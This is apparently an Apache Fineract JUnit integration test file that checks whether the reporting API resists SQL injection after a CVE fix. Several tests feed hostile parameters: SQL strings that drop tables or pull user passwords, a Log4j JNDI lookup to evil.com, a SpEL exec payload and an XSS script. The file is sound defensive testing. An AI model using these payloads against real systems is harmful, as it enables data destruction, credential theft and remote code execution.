/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership. The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.fineract.integrationtests;

import static io.restassured.RestAssured.given;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.restassured.builder.RequestSpecBuilder;
import io.restassured.builder.ResponseSpecBuilder;
import io.restassured.http.ContentType;
import io.restassured.response.Response;
import io.restassured.specification.RequestSpecification;
import io.restassured.specification.ResponseSpecification;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import lombok.extern.slf4j.Slf4j;
import org.apache.fineract.infrastructure.security.service.SqlInjectionPreventerService;
import org.apache.fineract.integrationtests.common.Utils;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Comprehensive integration tests for SQL injection prevention in reporting functionality (PS-2667).
 *
 * Tests the migration from ESAPI to native database escaping and validates that CVE-2025-5878 is fixed. Covers
 * ReadReportingServiceImpl security measures through actual API endpoints.
 *
 * @see ReadReportingServiceImpl
 * @see SqlInjectionPreventerService
 */
@Slf4j
public class SqlInjectionReportingServiceIntegrationTest extends BaseLoanIntegrationTest {

    private RequestSpecification requestSpec;
    private ResponseSpecification responseSpec;
    private Long testReportId = null;
    private static final String TEST_REPORT_NAME = "SQL_Injection_Test_Report";
    private static final String TEST_REPORT_SQL = "SELECT 1 as test_column, 'Test Data' as test_name";

    @BeforeEach
    public void setup() {
        Utils.initializeRESTAssured();
        this.requestSpec = new RequestSpecBuilder().setContentType(ContentType.JSON).build();
        this.requestSpec.header("Authorization", "Basic " + Utils.loginIntoServerAndGetBase64EncodedAuthenticationKey());
        this.requestSpec.header("Fineract-Platform-TenantId", "default");
        this.responseSpec = new ResponseSpecBuilder().expectStatusCode(200).build();

        // Create test report for the tests
        createTestReportIfNotExists();
    }

    @AfterEach
    public void cleanup() {
        // Clean up test report after tests
        if (testReportId != null) {
            try {
                deleteTestReport();
            } catch (Exception e) {
                log.warn("Failed to clean up test report: " + e.getMessage());
            }
        }
    }

    private void createTestReportIfNotExists() {
        try {
            // First try to get the report to see if it exists - use direct RestAssured call to handle 404
            Response response = given().spec(requestSpec).when().get("/fineract-provider/api/v1/reports");

            if (response.getStatusCode() == 200) {
                String existingReports = response.asString();
                if (existingReports.contains("\"reportName\":\"" + TEST_REPORT_NAME + "\"")) {
                    log.info("Test report '{}' already exists", TEST_REPORT_NAME);
                    // Extract the ID for cleanup
                    try {
                        String pattern = "\"id\":(\\d+)[^}]*\"reportName\":\"" + TEST_REPORT_NAME + "\"";
                        java.util.regex.Pattern p = java.util.regex.Pattern.compile(pattern);
                        java.util.regex.Matcher m = p.matcher(existingReports);
                        if (m.find()) {
                            testReportId = Long.parseLong(m.group(1));
                            log.info("Found existing test report with ID: {}", testReportId);
                        }
                    } catch (Exception ex) {
                        log.debug("Could not extract existing report ID");
                    }
                    return;
                }
            } else if (response.getStatusCode() == 404) {
                log.debug("Reports endpoint returned 404 (no reports exist yet), will create report");
            } else {
                log.debug("Reports endpoint returned unexpected status: {}, will try to create report", response.getStatusCode());
            }
        } catch (Exception e) {
            log.debug("Report list fetch failed, will try to create report: {}", e.getMessage());
        }

        // Create the test report
        String reportJson = "{" + "\"reportName\": \"" + TEST_REPORT_NAME + "\"," + "\"reportType\": \"Table\","
                + "\"reportCategory\": \"Client\"," + "\"reportSql\": \"" + TEST_REPORT_SQL + "\","
                + "\"description\": \"Test report for SQL injection prevention tests\"," + "\"useReport\": true" + "}";

        try {
            // Use direct RestAssured call to handle different response codes
            Response postResponse = given().spec(requestSpec).contentType(ContentType.JSON).body(reportJson).when()
                    .post("/fineract-provider/api/v1/reports");

            if (postResponse.getStatusCode() == 200 || postResponse.getStatusCode() == 201) {
                String response = postResponse.asString();
                // Extract report ID from response for cleanup
                if (response.contains("resourceId")) {
                    String idStr = response.replaceAll(".*\"resourceId\":(\\d+).*", "$1");
                    testReportId = Long.parseLong(idStr);
                    log.info("Created test report with ID: {}", testReportId);
                } else {
                    throw new RuntimeException("Test report creation failed - no resourceId in response: " + response);
                }
            } else {
                String errorResponse = postResponse.asString();
                log.error("Report creation failed - Status: {}, Body: {}, Headers: {}", postResponse.getStatusCode(), errorResponse,
                        postResponse.getHeaders());
                log.error("Sent JSON: {}", reportJson);
                throw new RuntimeException(
                        "Test report creation failed with status " + postResponse.getStatusCode() + ": " + errorResponse);
            }
        } catch (Exception e) {
            // This is a critical failure - tests cannot proceed without the test report
            throw new RuntimeException(
                    "CRITICAL: Could not create test report '" + TEST_REPORT_NAME + "'. Tests cannot proceed. Error: " + e.getMessage(), e);
        }
    }

    private void deleteTestReport() {
        if (testReportId != null) {
            try {
                Utils.performServerDelete(requestSpec, responseSpec, "/fineract-provider/api/v1/reports/" + testReportId, "");
                log.info("Deleted test report with ID: {}", testReportId);
            } catch (Exception e) {
                log.warn("Failed to delete test report: " + e.getMessage());
            }
        }
    }

    /**
     * UC1: Test legitimate report execution works correctly Validates that the SQL injection prevention doesn't break
     * normal functionality
     */
    @Test
    void uc1_testLegitimateReportExecution() {
        log.info("Testing that legitimate reports still work after SQL injection prevention");

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test with the test report we created in setup - this MUST succeed
        String response = Utils.performServerGet(requestSpec, responseSpec,
                "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams), null);

        assertNotNull(response);
        assertNotEquals("", response.trim());

        // Debug: Log actual response to understand structure
        log.info("Response from report execution: {}", response);

        // Verify response is valid JSON structure
        assertTrue(response.contains("columnHeaders") || response.contains("data") || response.contains("test_column"),
                "Response should contain expected JSON structure, but got: " + response);
    }

    /**
     * UC2: Test parameter injection through query parameters Validates that malicious content in query parameters is
     * also properly handled
     */
    @Test
    void uc2_testParameterInjectionPrevention() {
        log.info("Testing parameter injection prevention through query parameters");

        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1'; DROP TABLE m_office; --");
        maliciousParams.put("R_startDate", "2023-01-01' UNION SELECT * FROM m_appuser --");
        maliciousParams.put("R_endDate", "2023-12-31'); DELETE FROM stretchy_report; --");

        // Test with legitimate report name but malicious parameters
        // This should either succeed with empty/safe results or fail with validation error
        // but NOT with SQL syntax errors
        try {
            String response = Utils.performServerGet(requestSpec, responseSpec, "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME
                    + "?genericResultSet=false&" + toQueryString(maliciousParams), null);

            // If we get here, the SQL injection was prevented and handled safely
            log.info("SQL injection prevented - query executed safely with malicious parameters");
        } catch (AssertionError exception) {
            // The response should indicate parameter validation error or safe handling
            // NOT SQL syntax errors which would indicate successful injection
            assertFalse(exception.getMessage().toLowerCase().contains("syntax error"),
                    "Should not get SQL syntax error, got: " + exception.getMessage());
            assertFalse(exception.getMessage().toLowerCase().contains("you have an error in your sql"),
                    "Should not get SQL error, got: " + exception.getMessage());

            // Should be a validation error, not a 404
            assertFalse(exception.getMessage().contains("404"), "Should not get 404 - report should exist. Got: " + exception.getMessage());

            log.info("Got expected validation error: {}", exception.getMessage());
        }
    }

    /**
     * UC3: Test type validation whitelist - only 'report' and 'parameter' types should be allowed This validates the
     * whitelist implementation for report types
     */
    @ParameterizedTest(name = "Report Type Validation: {0}")
    @ValueSource(strings = { "report", "parameter" })
    void uc3_testValidReportTypes(String validType) {
        log.info("Testing valid report type: {}", validType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test that valid report types work through the API
        try {
            String response = Utils.performServerGet(requestSpec, responseSpec,
                    "/runreports/TestReport?reportType=" + validType + "&genericResultSet=false&" + toQueryString(queryParams), null);
            // Should get a proper response or 404 (report not found), not validation error
        } catch (AssertionError e) {
            // For valid types, we expect 404 (report not found), not validation errors
            assertTrue(e.getMessage().contains("404"));
        }
    }

    /**
     * UC4: Test invalid report types that should be rejected by whitelist
     */
    @ParameterizedTest(name = "Invalid Report Type: {0}")
    @ValueSource(strings = { "table", "view", "procedure", "function", "schema", "database", "admin", "user", "system", "config" })
    void uc4_testInvalidReportTypes(String invalidType) {
        log.info("Testing invalid report type: {}", invalidType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // These should be rejected and result in 404 (report not found) or validation error
        AssertionError exception = assertThrows(AssertionError.class, () -> {
            Utils.performServerGet(requestSpec, responseSpec,
                    "/runreports/TestReport?reportType=" + invalidType + "&genericResultSet=false&" + toQueryString(queryParams), null);
        });

        // Should get 404 or validation error, not SQL execution error
        assertTrue(exception.getMessage().contains("404") || exception.getMessage().contains("validation"));
        assertFalse(exception.getMessage().toLowerCase().contains("sql syntax"));
    }

    /**
     * UC5: Test database-specific escaping through API behavior for MySQL/MariaDB
     */
    @Test
    void uc5_testMySQLEscapingThroughAPI() {
        log.info("Testing MySQL/MariaDB escaping behavior through API");

        // Test MySQL special characters in parameters
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1' OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client;");
        queryParams.put("R_startDate", "2023-01-01\\' OR 1=1 --");

        // Use the real test report to ensure SQL injection prevention works with actual queries
        try {
            String response = Utils.performServerGet(requestSpec, responseSpec,
                    "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams),
                    null);

            // If successful, the special characters were safely escaped
            assertNotNull(response);
            log.info("MySQL/MariaDB special characters safely escaped");
        } catch (AssertionError e) {
            // Should not get SQL syntax errors - only validation errors
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"),
                    "Should not get SQL syntax error for MySQL escaping test. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("you have an error in your sql"),
                    "Should not get SQL error. Got: " + e.getMessage());

            log.info("MySQL/MariaDB escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC6: Test database-specific escaping through API for PostgreSQL
     */
    @Test
    void uc6_testPostgreSQLEscapingThroughAPI() {
        log.info("Testing PostgreSQL escaping behavior through API");

        // Test PostgreSQL-specific SQL injection patterns
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1'::text OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client CASCADE;");
        queryParams.put("R_startDate", "2023-01-01'::date OR TRUE --");
        queryParams.put("R_endDate", "$$; DROP TABLE m_client; $$");

        // Use the real test report to ensure SQL injection prevention works
        try {
            String response = Utils.performServerGet(requestSpec, responseSpec,
                    "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams),
                    null);

            // If successful, the PostgreSQL special syntax was safely escaped
            assertNotNull(response);
            log.info("PostgreSQL special characters and syntax safely escaped");
        } catch (AssertionError e) {
            // Should not get SQL syntax errors - only validation errors
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"),
                    "Should not get SQL syntax error for PostgreSQL escaping test. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("you have an error in your sql"),
                    "Should not get SQL error. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("error") && e.getMessage().toLowerCase().contains("position"),
                    "Should not get PostgreSQL position error. Got: " + e.getMessage());

            log.info("PostgreSQL escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC7: Test concurrent access to ensure thread safety through API
     */
    @Test
    void uc7_testConcurrentAccess() throws InterruptedException, ExecutionException {
        log.info("Testing concurrent access to SQL injection prevention through API");

        int threadCount = 5;
        int operationsPerThread = 3;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);

        List<Future<Boolean>> futures = new java.util.ArrayList<>();

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;
            Future<Boolean> future = executor.submit(new Callable<Boolean>() {

                @Override
                public Boolean call() {
                    try {
                        for (int j = 0; j < operationsPerThread; j++) {
                            String input = "test-input-" + threadId + "-" + j;

                            Map<String, String> queryParams = new HashMap<>();
                            queryParams.put("R_officeId", "1");

                            Utils.performServerGet(requestSpec, responseSpec,
                                    "/fineract-provider/api/v1/runreports/" + URLEncoder.encode(input, StandardCharsets.UTF_8)
                                            + "?genericResultSet=false&" + toQueryString(queryParams),
                                    null);
                        }
                        return true;
                    } catch (AssertionError e) {
                        // 404 is expected for non-existent reports
                        return e.getMessage().contains("404");
                    } catch (Exception e) {
                        log.error("Error in thread {}: {}", threadId, e.getMessage());
                        return false;
                    }
                }
            });
            futures.add(future);
        }

        executor.shutdown();
        assertTrue(executor.awaitTermination(60, TimeUnit.SECONDS), "All threads should complete within 60 seconds");

        for (Future<Boolean> future : futures) {
            assertTrue(future.get(), "All concurrent operations should succeed or return 404");
        }

        log.info("Concurrent access test completed successfully with {} threads and {} operations per thread", threadCount,
                operationsPerThread);
    }

    /**
     * UC8: Test report parameter injection with complex nested structures
     */
    @Test
    void uc8_testComplexParameterInjection() {
        log.info("Testing complex parameter injection scenarios");

        // Test various parameter injection patterns that were historically problematic
        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1) UNION SELECT username,password FROM m_appuser WHERE id=1--");
        maliciousParams.put("R_clientId", "${jndi:ldap://evil.com/a}"); // Log4j style injection
        maliciousParams.put("R_startDate", "'; DROP TABLE IF EXISTS test; --");
        maliciousParams.put("R_endDate", "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"); // SpEL injection
        maliciousParams.put("R_userId", "<script>alert('xss')</script>"); // XSS attempt in parameter

        try {
            Utils.performServerGet(requestSpec, responseSpec, "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME
                    + "?genericResultSet=false&" + toQueryString(maliciousParams), null);
            // If we get here without exception, the response should be safe
            log.info("Complex parameter injection prevented - query executed safely");
        } catch (AssertionError e) {
            // Should get parameter validation error, not SQL injection
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"), "Should not get SQL syntax error. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("you have an error in your sql"),
                    "Should not get SQL error. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("table") && e.getMessage().toLowerCase().contains("exist"),
                    "Should not get table exists error. Got: " + e.getMessage());
        }
    }

    /**
     * UC9: Test legitimate reports with various parameter types
     */
    @ParameterizedTest(name = "Parameter Type: {0}")
    @CsvSource(delimiterString = " | ", value = { "R_officeId | 1 | Numeric parameter", "R_startDate | 2023-01-01 | Date parameter",
            "R_endDate | 2023-12-31 | Date parameter", "R_currencyId | USD | String parameter", "R_loanProductId | 1 | Numeric parameter" })
    void uc9_testLegitimateParameterTypes(String paramName, String paramValue, String description) {
        log.info("Testing legitimate parameter: {} = {} ({})", paramName, paramValue, description);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put(paramName, paramValue);

        try {
            String response = Utils.performServerGet(requestSpec, responseSpec,
                    "/fineract-provider/api/v1/runreports/" + TEST_REPORT_NAME + "?genericResultSet=false&" + toQueryString(queryParams),
                    null);

            // Valid parameters should return data successfully
            assertNotNull(response);

            // Should not contain SQL error indicators
            assertFalse(response.toLowerCase().contains("syntax error"));
            assertFalse(response.toLowerCase().contains("sql exception"));

            log.debug("Legitimate parameter '{}' = '{}' processed successfully", paramName, paramValue);
        } catch (AssertionError e) {
            // For legitimate parameters, we should not get errors unless it's a data issue
            // But definitely not SQL syntax errors
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"),
                    "Should not get SQL syntax error for legitimate parameter. Got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("you have an error in your sql"),
                    "Should not get SQL error for legitimate parameter. Got: " + e.getMessage());

            log.info("Parameter validation for '{}' = '{}': {}", paramName, paramValue, e.getMessage());
        }
    }

    /**
     * UC10: Test cross-database compatibility through API
     */
    @Test
    void uc10_testCrossDatabaseCompatibility() {
        log.info("Testing cross-database compatibility for SQL injection prevention through API");

        String testInput = "test-input-with-special-chars";

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        try {
            Utils.performServerGet(requestSpec, responseSpec, "/fineract-provider/api/v1/runreports/"
                    + URLEncoder.encode(testInput, StandardCharsets.UTF_8) + "?genericResultSet=false&" + toQueryString(queryParams), null);
        } catch (AssertionError e) {
            // Should get 404 (report not found) not database-specific errors
            assertTrue(e.getMessage().contains("404"));
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"));
            assertFalse(e.getMessage().toLowerCase().contains("sql"));

            log.info("Cross-database compatibility test passed - got expected 404 response");
        }
    }

    /**
     * Helper method to convert parameters map to query string
     */
    private String toQueryString(Map<String, String> params) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (sb.length() > 0) {
                sb.append("&");
            }
            sb.append(entry.getKey()).append("=");
            if (entry.getValue() != null) {
                sb.append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8));
            }
        }
        return sb.toString();
    }
}
